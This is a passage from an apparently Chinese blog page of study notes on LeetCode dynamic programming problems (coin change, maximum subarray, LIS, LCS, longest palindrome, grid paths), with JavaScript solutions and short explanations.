class="headerlink" title="零钱兑换"></a>零钱兑换</h2><ul><li><a href="https://leetcode-cn.com/problems/coin-change/" target="_blank" rel="noopener">leetcode322</a></li></ul><pre class=" language-js"><code class="language-js">给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 <span class="token operator">-</span><span class="token number">1</span>。你可以认为每种硬币的数量是无限的。示例 <span class="token number">1</span>：输入：coins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> amount <span class="token operator">=</span> <span class="token number">11</span>输出：<span class="token number">3</span> 解释：<span class="token number">11</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">1</span>示例 <span class="token number">2</span>：输入：coins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> amount <span class="token operator">=</span> <span class="token number">3</span>输出：<span class="token operator">-</span><span class="token number">1</span></code></pre><ul><li>设<code>dp[i]</code> 表示总金额为 i 的时候最优解法的硬币数</li><li>若面值有1，2，5要凑够120元，此时可以拿一枚面值为1的，最优个数为 <code>dp[119] + 1</code>，拿一枚面试为2的，最优个数为<code>dp[118] + 1</code>，拿一枚面值为5的，最优个数为<code>dp[115] + 1</code>，取三种的最小值即可</li><li>状态转移方程：<code>dp[i] = Math.min(dp[i - coin] + 1, dp[i - coin] + 1, ...)</code></li><li>边界：<code>dp[0] = 0</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> coinChange <span class="token operator">=</span> <span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">let</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span> amount <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span> <span class="token number">Infinity</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> amount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> coin <span class="token keyword">of</span> coins<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> coin <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> coin<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>amount<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">Infinity</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">:</span> dp<span class="token punctuation">[</span>amount<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="最大子序列和"><a href="#最大子序列和" class="headerlink" title="最大子序列和"></a>最大子序列和</h2><pre class=" language-js"><code class="language-js">给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。示例<span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">6</span>解释<span class="token punctuation">:</span> 连续子数组 <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> 的和最大，为 <span class="token number">6</span>。</code></pre><ul><li>分析：答案肯定是在以下组合中：</li><li>第一个子组合是以第一个数字结尾的连续序列，也就是[-2]，最大值-2</li><li>第二个子组合是以第二个数字结尾的连续序列，也就是[-2,1], [1]，最大值1</li><li>第三个子组合是以第三个数字结尾的连续序列，也就是[-2,1,-3], [1,-3], [-3]，最大值-2</li><li>第四个子组合是以第四个数字结尾的连续序列，也就是[-2,1,-3,4],[1.-3,4],[-3,4],[4]，最大值4</li><li>第n个子组合……</li></ul><hr><ul><li>最优子结构：组合n只是在组合n-1的基础上每一个数组后面添加1个数字num，然后增加一个只有第n个数字的数组[num]，只需要比较前一个组合的最大值+num和num</li><li>边界：<code>dp[0] = nums[0]</code></li><li>状态转移方程：<code>dp[i] = max(dp[i-1] + nums[i], nums[i])</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 组合3只是在组合2的基础上每一个数组后面添加第3个数字，也就是3，然后增加一个只有第三个数字的数组[3]</span><span class="token comment" spellcheck="true">// 只需要比较前一个组合的最大值+num和num</span><span class="token comment" spellcheck="true">// 计算出九个组合的最大值，再取最大的即可</span><span class="token keyword">var</span> maxSubArray <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> result<span class="token punctuation">)</span> result <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h2><ul><li><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/" target="_blank" rel="noopener">leetcode300</a></li></ul><pre class=" language-js"><code class="language-js">输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">]</span>输出：<span class="token number">4</span>解释：最长递增子序列是 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">]</span>，因此长度为 <span class="token number">4</span> 。</code></pre><ul><li><code>dp[i]</code>：以<code>nums[i]</code>结尾的最长子序列长度</li><li>转移方程： 设<code>j∈[0,i)</code>，考虑每轮计算新 <code>dp[i]</code> 时，遍历 <code>[0,i)</code> 列表区间，做以下判断：<ul><li>当 <code>nums[i] &gt; nums[j]</code> 时： <code>nums[i]</code>可以接在 <code>nums[j]</code>之后（此题要求严格递增），此情况下最长上升子序列长度为 <code>dp[j] + 1</code> ；</li><li>当 <code>nums[i] &lt;= nums[j]</code> 时：<code>nums[i]</code> 无法接在 <code>nums[j]</code>之后，此情况上升子序列不成立，跳过。</li><li>故转移方程：<code>dp[i] = max(dp[i], dp[j] + 1) for j in [0, i)</code></li></ul></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> lengthOfLIS <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">const</span> len <span class="token operator">=</span> nums<span class="token punctuation">.</span>length    <span class="token keyword">const</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>dp<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="最长公共子序列-LCS"><a href="#最长公共子序列-LCS" class="headerlink" title="最长公共子序列(LCS)"></a>最长公共子序列(LCS)</h2><ul><li><a href="https://leetcode-cn.com/problems/longest-common-subsequence/" target="_blank" rel="noopener">leetcode1143</a></li><li><a href="https://leetcode-cn.com/problems/longest-common-subsequence/solution/dong-tai-gui-hua-xiang-jin-zhu-shi-fu-qiu-jie-guo-/" target="_blank" rel="noopener">参考题解1</a>，<a href="https://leetcode-cn.com/problems/longest-common-subsequence/solution/1143-zui-chang-gong-gong-zi-xu-lie-dong-zde2v/" target="_blank" rel="noopener">参考题解2(填表)</a></li></ul><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span><span class="token punctuation">:</span>输入：text1 <span class="token operator">=</span> <span class="token string">"abcde"</span><span class="token punctuation">,</span> text2 <span class="token operator">=</span> <span class="token string">"ace"</span> 输出：<span class="token number">3</span>  解释：最长公共子序列是 <span class="token string">"ace"</span>，它的长度为 <span class="token number">3</span>。示例 <span class="token number">2</span><span class="token punctuation">:</span>输入：text1 <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">,</span> text2 <span class="token operator">=</span> <span class="token string">"abc"</span>输出：<span class="token number">3</span>解释：最长公共子序列是 <span class="token string">"abc"</span>，它的长度为 <span class="token number">3</span></code></pre><ul><li><code>dp[i][j]：字符串 text1 和 text2 中对应的前i，前j个字符的LCS的长度</code></li><li>当<code>text1[i] === text2[j]</code>时，说明 <code>text1[i]</code> 或者 <code>text2[j]</code>对应的字符是最长公共子序列的一部分，所以有 <code>dp[i][j] = 1 + dp[i-1][j-1]</code></li><li>当<code>text1[i] !== text2[j]</code>时，此时我们要看两个字符串分别单独往回撤一个字符串的对比情况，获取两者的最大值即可，所以有<code>dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1], dp[i - 1][j - 1])</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> longestCommonSubsequence <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>text1<span class="token punctuation">,</span> text2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> m <span class="token operator">=</span> text1<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">const</span> n <span class="token operator">=</span> text2<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">const</span> dp <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token function">Array</span><span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">Array</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>text1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">===</span> text2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h2><ul><li><a href="https://leetcode-cn.com/problems/longest-palindromic-substring" target="_blank" rel="noopener">leetcode5</a></li></ul><pre class=" language-js"><code class="language-js">给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 <span class="token number">1000</span>。示例 <span class="token number">1</span>：输入<span class="token punctuation">:</span> <span class="token string">"babad"</span>输出<span class="token punctuation">:</span> <span class="token string">"bab"</span>注意<span class="token punctuation">:</span> <span class="token string">"aba"</span> 也是一个有效答案。示例 <span class="token number">2</span>：输入<span class="token punctuation">:</span> <span class="token string">"cbbd"</span>输出<span class="token punctuation">:</span> <span class="token string">"bb"</span></code></pre><ul><li>分析：i 到 j 是回文子串那么 i+1 到 j-1 也是回文子串</li><li>i 到 j 的最优子结构就是 i+1 到 j-1</li><li>边界就是单个字符或者 aa 这种</li><li>状态转移方程是：<code>dp[i][j] = dp[i+1][j-1] &amp;&amp; s[i] == s[j]</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> longestPalindrome <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">""</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// 从后向前遍历，因为 dp[i] 依赖于 dp [i+1]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> s<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> s<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 边界</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> j <span class="token operator">||</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> i <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 状态转移</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> j <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">></span> res<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h2><ul><li><a href="https://leetcode-cn.com/problems/unique-paths/" target="_blank" rel="noopener">leetcode62</a></li></ul><pre class=" language-js"><code class="language-js">一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。问总共有多少条不同的路径？示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">2</span>输出<span class="token punctuation">:</span> <span class="token number">3</span>解释<span class="token punctuation">:</span>从左上角开始，总共有 <span class="token number">3</span> 条路径可以到达右下角。<span class="token number">1</span><span class="token punctuation">.</span> 向右 <span class="token operator">-</span><span class="token operator">></span> 向右 <span class="token operator">-</span><span class="token operator">></span> 向下<span class="token number">2</span><span class="token punctuation">.</span> 向右 <span class="token operator">-</span><span class="token operator">></span> 向下 <span class="token operator">-</span><span class="token operator">></span> 向右<span class="token number">3</span><span class="token punctuation">.</span> 向下 <span class="token operator">-</span><span class="token operator">></span> 向右 <span class="token operator">-</span><span class="token operator">></span> 向右示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> m <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">3</span>输出<span class="token punctuation">:</span> <span class="token number">28</span></code></pre><ul><li>分析：到达终点总是向右或向下，故到达终点的走法=到达其上面点的走法 + 到达其左面点的走法</li><li>状态转移：<code>map[m][n] = map[m-1][n] + map[m][n-1]</code></li><li>边界：<code>map[0][j] = 1,map[i][0] = 1</code></li></ul><pre class=" language-js"><code class="language-js">    <span class="token comment" spellcheck="true">// 初始化二维数组</span>    <span class="token keyword">let</span> map <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        map<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> map<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> map<span class="token punctuation">[</span>m<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span></code></pre><h4 id="Array-from"><a href="#Array-from" class="headerlink" title="Array.from"></a>Array.from</h4><p><strong>将一个类数组对象或者可遍历对象转换成一个真正的数组。</strong></p><ul><li><p>该类数组对象必须具有length属性，用于指定数组的长度。如果没有length属性，那么转换后的数组是一个空数组。</p></li><li><p>该类数组对象的属性名必须为数值型或字符串型的数字</p></li><li><p>该类数组对象的属性名可以加引号，也可以不加引号</p></li><li><code>Array.from</code>可以接受第二个参数，作用类似于数组的<code>map</code>方法，用来对每个元素进行处理，将处理后的值放入返回的数组。</li></ul><h2 id="最小路径和"><a href="#最小路径和" class="headerlink" title="最小路径和"></a>最小路径和</h2><ul><li><a href="https://leetcode-cn.com/problems/minimum-path-sum/" target="_blank" rel="noopener">leetcode64</a></li></ul><pre class=" language-js"><code class="language-js">给定一个包含非负整数的 m x n 网格 grid ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。说明：每次只能向下或者向右移动一步。示例 <span class="token number">1</span>：输入：grid <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token number">7</span>解释：因为路径 <span class="token number">1</span>→<span class="token number">3</span>→<span class="token number">1</span>→<span class="token number">1</span>→<span class="token number">1</span> 的总和最小。示例 <span class="token number">2</span>：输入：grid <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token number">12</span></code></pre><ul><li>思路：到<code>grid[i][j]</code>的最小值，肯定等于到<code>grid[i-1][j]</code>的最小值和到<code>grid[i][j-1]</code>的最小值中较小的加上当前<code>grid[i][j]</code>的值</li><li>最优子结构：<code>dp[i-1][j], 